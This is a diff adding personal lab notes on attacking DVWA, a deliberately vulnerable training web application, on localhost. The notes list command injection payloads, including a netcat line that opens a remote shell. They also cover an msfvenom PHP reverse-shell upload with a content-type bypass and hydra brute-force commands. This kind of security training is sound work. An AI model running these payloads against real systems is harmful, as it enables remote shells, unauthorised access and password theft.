@@ -1,0 +1,62 @@
+COMMAND INJECTION LINUX DVWA
+Command module on dvwa where you can ping differents ip addresses
+LOW DIFF.
+127.0.0.1 && ls
+127.0.0.1 & ls
+127.0.0.1; ls
+127.0.0.1 | ls
+127.0.0.1 &&nc -c sh 127.0.0.1 9001 --> execute netcat shell on the command injection module 
+start a listener with nc -lnvp 9001 on the attacker
+
+MEDIUM DIFF.
+127.0.0.1 | ls
+
+HIGH DIFF.
+127.0.0.1 |ls
+
+COMMAND INJECTION WINDOWS DVWA
+LOW DIFF. 
+|dir c:\
+|type c:\"filename.txt"
+|hostname
+|tasklist
+|taskkill /PID 7070 /F
+|whoami
+
+FILE UPLOAD VULNERABILITIES DVWA
+LOW DIFF
+msfvenom -p php/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f raw >exploit.php
+
+now run Metasploit and start a multi handler to listen to php reverse session
+msfconsole
+use exploit/multi/hander set payload php/meterpreter/reverse_tcp
+upload the file with browse upload 
+open link in browser menu like /hackable/upload/exploit.php
+now the reverse shell was opened on the attacker
+
+MEDIUM DIFF. 
+same msfvenom and metasploit commands
+open burp try to upload the file like in the low diff.
+change the content type from application/x-php to image/jpeg
+
+Brute forcing web applications passwords with burp and hydra
+LOW DIFFICULT
+go to the page and try to login with username and passwords
+open burpsuite and enable proxy , resend the username and password , in burp proxy
+right click and send to the intruder
+click clear
+select the password and click on "Add"
+in the payload step select your list  (wordlists/jon.lst)
+and click to start attack
+check the lenght , the password have a changed lenght size
+ 
+ now go network setting 
+ go to the stores value and select the cookie format the command like:
+ hydra -l admin -P /usr/share/wordlists/john.lst 'http-getform://127.0.0.1:42001/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\:PHPSESSID=7vs4mhc1q4dnp3f6cgikl01v9q; security=low:F=Username and/orpassword incorrect'
+ 
+ MEDIUM DIFFICULT 
+ the same commands but change the cookie value to medium
+ hydra -l admin -P /usr/share/wordlists/john.lst 'http-getform://127.0.0.1:42001/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\:PHPSESSID=7vs4mhc1q4dnp3f6cgikl01v9q; security=medium:F=Username and/or password incorrect' 
+ 
+
+ 
